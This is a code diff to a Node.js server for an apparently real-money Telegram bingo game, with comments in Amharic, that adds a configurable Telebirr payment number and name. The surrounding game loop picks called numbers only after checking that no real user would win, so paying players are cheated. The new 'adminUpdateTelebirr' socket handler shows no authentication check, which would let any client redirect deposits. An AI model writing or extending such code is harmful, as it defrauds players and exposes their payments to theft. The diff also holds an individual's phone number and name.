@@ -30,6 +30,12 @@ const allRegisteredUsers = new Set();
 let isDepositLocked = false;
 let isWithdrawLocked = false;
 
+// የቴሌብር መረጃዎች (አድሚኑ ከቦት ወይም ከአድሚን ፓነል መቀየር እንዲችል)
+let telebirrConfig = {
+    phone: "0940272544",
+    name: "Abel Seyoum"
+};
+
 // የቁጥር ጥሪ ቅደም ተከተል (Loop የሚያደርግ)
 const baseNumberFlowSequence = [
     17, 19, 22, 23, 32, 18, 19, 12, 27, 27, 23, 17, 19, 19, 22, 19, 24, 23, 19, 18, 
@@ -511,7 +517,6 @@ function startMainGameLoop() {
                 });
             }
 
-            // ኳሶች በአንድ አምድ ላይ እንዳይከመሩ በዘፈቀደ ሙሉ በሙሉ እንዲቀላቀሉ (Shuffle) ተደርጓል
             let availableNumbers = Array.from({length: 75}, (_, i) => i + 1);
             availableNumbers.sort(() => 0.5 - Math.random());
             
@@ -606,8 +611,6 @@ function startMainGameLoop() {
                     if (availableNumbers.length > 0) {
                         let candidateIndices = [];
 
-                        // ==================== የተመጣጠነ እና የተለያየ አቅጣጫ ቁጥር ምርጫ (Balanced Column Distribution) ====================
-                        // ሪል ዩዘር ፓተርን እንዳይሰራ እየጠበቅን፣ ከሁሉም አምዶች (B, I, N, G, O) በዘፈቀደ እንዲመረጥ ማድረግ
                         for (let i = 0; i < availableNumbers.length; i++) {
                             let testNum = availableNumbers[i];
                             let wouldRealUserWin = false;
@@ -631,7 +634,6 @@ function startMainGameLoop() {
                         }
 
                         if (candidateIndices.length > 0) {
-                            // ከደህና ከሆኑት ቁጥሮች መካከል በዘፈቀደ አንዱን መምረጥ (በአንድ አምድ ላይ እንዳይከመር ያደርጋል)
                             let randCandIdx = candidateIndices[Math.floor(Math.random() * candidateIndices.length)];
                             calledNum = availableNumbers.splice(randCandIdx, 1)[0];
                         } else {
@@ -706,6 +708,23 @@ async function pollTelegramUpdates() {
                         let parts = msgText.split(' ');
                         let cmd = parts[0].toLowerCase();
                         let targetUserId = parts[1] ? String(parts[1]).trim() : null;
+
+                        // አድሚኑ ከቴሌግራም ቦት ሆኖ ቁጥር መቀየር እንዲችል: /settelebirr 0912345678 ስም
+                        if (cmd === '/settelebirr' && parts[1]) {
+                            let newPhone = parts[1];
+                            let newName = parts.slice(2).join(' ') || telebirrConfig.name;
+                            
+                            telebirrConfig.phone = newPhone;
+                            telebirrConfig.name = newName;
+
+                            io.emit('telebirrConfigUpdated', telebirrConfig);
+
+                            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                                chat_id: senderChatId,
+                                text: `✅ የቴሌብር ቁጥር በተሳካ ሁኔታ ተቀይሯል!\n📱 ቁጥር: \`${newPhone}\`\n👤 ስም: *${newName}*`,
+                                parse_mode: 'Markdown'
+                            }).catch(() => {});
+                        }
 
                         if ((cmd === '/bonus20' || cmd === '/bonus50') && targetUserId) {
                             let bonusAmount = cmd === '/bonus20' ? 20 : 50;
@@ -940,6 +959,9 @@ io.on('connection', (socket) => {
     refreshTakenCardsList();
 
     socket.emit('financialLockStatus', { isDepositLocked, isWithdrawLocked });
+    
+    // ዩዘር አፕ ሲከፍት አሁን ያለው የቴሌብር ቁጥር እንዲደርሰው ማድረግ
+    socket.emit('telebirrConfigUpdated', telebirrConfig);
 
     socket.on('registerRealUser', (userData) => {
         if (userData && userData.userId) {
@@ -1008,6 +1030,17 @@ io.on('connection', (socket) => {
         }
         io.emit('financialLockStatus', { isDepositLocked, isWithdrawLocked });
         socket.emit('adminLockResponse', { success: true, message: `✅ የተሳካ ሁኔታ ተቀይሯል!` });
+    });
+
+    // ከአድሚን ፓነል ቴሌብር ቁጥር መቀየሪያ ዌብኬት ሪኩዌስት
+    socket.on('adminUpdateTelebirr', (data) => {
+        if (data && data.phone) {
+            telebirrConfig.phone = data.phone;
+            if (data.name) telebirrConfig.name = data.name;
+
+            io.emit('telebirrConfigUpdated', telebirrConfig);
+            socket.emit('adminTelebirrResponse', { success: true, message: `✅ የቴሌብር ቁጥር ተቀይሯል!` });
+        }
     });
 
     socket.on('adminSendBonus', (data) => {
